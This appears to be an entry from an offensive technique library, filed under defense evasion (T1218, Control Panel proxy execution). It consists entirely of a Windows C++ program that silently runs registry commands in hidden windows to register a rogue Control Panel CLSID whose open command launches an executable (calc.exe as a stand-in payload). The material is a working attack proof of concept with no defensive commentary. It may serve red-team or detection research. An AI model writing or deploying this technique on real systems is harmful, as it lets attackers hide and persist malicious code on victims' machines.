---
title: ".002.Control Panel"
folder: "07. Defense Evasion/T1218 System Binary Proxy Execution "
---


#include <windows.h>
#include <fstream>
#include <iostream>


void AutorunRegistryBackground4() {

    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace\\{ac0a65f5-81c0-4b42-84e9-ae3527f4dbd1}\" /f";
    const char* command1 = "reg add \"HKEY_CLASSES_ROOT\\CLSID\\{ac0a65f5-81c0-4b42-84e9-ae3527f4dbd1}\" /t REG_SZ /d \"Test\" /f";
    const char* command2 = "reg add \"HKEY_CLASSES_ROOT\\CLSID\\{ac0a65f5-81c0-4b42-84e9-ae3527f4dbd1}\\DefaultIcon\" /t REG_SZ /d \"%SystemRoot%\\System32\\SHELL32.dll,10\" /f";
    const char* command3 = "reg add \"HKEY_CLASSES_ROOT\\CLSID\\{ac0a65f5-81c0-4b42-84e9-ae3527f4dbd1}\\Shell\\Open\\Command\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    AutorunRegistryBackground4();
    return 0;
}